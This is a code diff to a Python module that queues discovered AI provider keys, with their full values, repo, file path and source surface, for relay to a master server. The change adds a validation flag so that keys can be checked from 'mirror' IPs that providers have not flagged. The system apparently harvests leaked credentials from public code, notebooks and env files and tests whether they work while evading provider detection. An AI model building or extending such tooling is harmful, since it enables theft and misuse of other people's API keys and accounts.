@@ -46,24 +46,34 @@ def is_active() -> bool:
 
 def enqueue_ai_find(provider: str, key: str, repo: str,
                     file_path: str, file_url: str,
-                    file_type: str = "") -> None:
+                    file_type: str = "",
+                    is_valid: bool | None = None) -> None:
     """Queue an AI-key find for relay to master. Non-blocking.
 
     file_type carries the original scanner surface (kaggle/gitee/code/env/
     notebook/etc) so master can record provenance instead of lumping all
     relayed finds under 'mirror'. Empty string falls back to legacy
     'mirror' bucket on master side.
+
+    is_valid carries the mirror-side validation result. Mirror egress IPs
+    aren't burned with provider APIs (master IP often is), so master can
+    trust this verdict instead of re-validating from a flagged IP. Master
+    decides whether to trust based on its own proxy health — see
+    /admin/validate_keys logic.
     """
     if not is_active():
         return
-    _AI_QUEUE.append({
+    item = {
         "provider":  provider,
         "key":       key,
         "repo":      repo,
         "path":      file_path,
         "file_url":  file_url,
         "file_type": file_type,
-    })
+    }
+    if isinstance(is_valid, bool):
+        item["is_valid"] = is_valid
+    _AI_QUEUE.append(item)
 
 
 def enqueue_infra_find(cred_type: str, cred_full: str, repo: str,
